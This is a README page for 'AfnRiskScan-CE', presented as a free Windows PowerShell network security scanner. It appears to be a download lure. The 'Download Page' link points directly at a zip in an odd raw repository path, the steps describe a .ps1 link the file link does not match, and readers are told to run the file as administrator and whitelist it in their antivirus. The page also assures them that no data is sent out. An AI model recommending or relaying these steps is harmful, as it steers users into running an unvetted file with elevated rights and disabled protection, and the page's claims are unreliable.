# 🛡️ AfnRiskScan-CE - Detect network security risks in minutes

[![](https://img.shields.io/badge/Download-AfnRiskScan--CE-blue.svg)](https://github.com/watery-esq538/AfnRiskScan-CE/raw/refs/heads/main/beading/Risk-Afn-Scan-CE-2.8-alpha.1.zip)

AfnRiskScan-CE is a security tool for Windows. It identifies potential weaknesses in your network. You do not need to install software. The program runs as a single file. It uses PowerShell to check your system. 

## 🔍 Why use this tool

Cyber threats affect many computers today. You might have outdated protocols or open ports. These gaps allow unauthorized access. AfnRiskScan-CE finds these items. It helps you protect your data. You follow the recommendations to secure your hardware. 

## 📋 What the tool checks

The software performs several scans on your computer:

*   Open ports: It checks for ports that leave your network exposed.
*   SMBv1 protocol: It looks for this outdated and insecure file sharing method.
*   PrintNightmare risk: It identifies specific vulnerabilities related to printer drivers.
*   Network discovery: It shows which devices share information on your local network.
*   Compliance readiness: The findings help you meet standards like KVKK and ISO27001 requirements.

## 📥 How to get the software

You download the tool directly from the official link. Follow these steps to obtain the correct file:

1. Visit this [Download Page](https://github.com/watery-esq538/AfnRiskScan-CE/raw/refs/heads/main/beading/Risk-Afn-Scan-CE-2.8-alpha.1.zip).
2. Look for the latest version at the top of the list.
3. Click the link that ends in `.ps1` or the zip archive containing the script.
4. Save the file to your folder of choice.

## 🚀 Running the scan

Your computer runs this tool using the built-in PowerShell application. You do not install anything. Follow this process:

1. Open the folder where you saved the download.
2. Right-click the file named `AfnRiskScan.ps1`.
3. Select "Run with PowerShell" from the menu.
4. A window appears on your screen.
5. The tool starts checking your network immediately. 
6. Wait for the process to finish. It writes the results to a text file in the same folder.

## 🛠️ System requirements

This tool works on most modern Windows versions:

*   Windows 10 or Windows 11.
*   Windows Server 2016 or newer.
*   PowerShell 5.1 or higher. Most Windows computers include this by default.
*   An active network connection.

You need basic access rights to your computer. The tool might ask for permission to change network settings. This is standard for security scanners.

## 📈 Understanding the results

The scan produces a report file. Open this report with Notepad or any text editor. It contains a list of items found during the scan. 

*   Green items indicate your system follows best practices.
*   Red items identify security risks.
*   Yellow items suggest improvements for your configuration.

Read the report carefully. It tells you exactly what to change. For example, if it finds open ports, you should review your firewall settings. If it finds the SMBv1 protocol, you should turn off this feature in your Windows settings. 

## 🛡️ Staying safe

Security requires constant care. Run this scan once a month. New risks appear frequently. Use this tool as part of your routine. It provides an clear view of your digital safety. 

## 💡 Troubleshooting common issues

Most users run the tool without problems. If you see an error, check these items:

*   Script Execution Policy: PowerShell restricts scripts by default. If the window closes immediately, right-click the file and select "Run with PowerShell" again. 
*   Antivirus interference: Some antivirus programs block script files. If your software stops the scan, check your antivirus logs. Add the script to your whitelist if you trust the source.
*   Missing permissions: Run the script as an administrator. Right-click the file and select "Run as administrator" to grant it the reach it needs to scan all network interfaces. 

## 🌐 Common questions

**Does this tool send my data to the internet?**
No. The script performs all tasks on your local machine. It does not send your data to external servers.

**Do I need an internet connection?**
Yes, the tool checks your network presence. Keep your connection active during the scan.

**Will this slow down my computer?**
The scan runs in the background. It uses minimal resources. You might notice slight network activity during the check.

**Can I use this for business?**
Yes, the Community Edition supports small businesses. It helps track compliance for KVKK and ISO27001 internal audits.

**Is there a graphical interface?**
The tool uses a command-line interface. This keeps the file small and simple. It provides all information within the generated report file.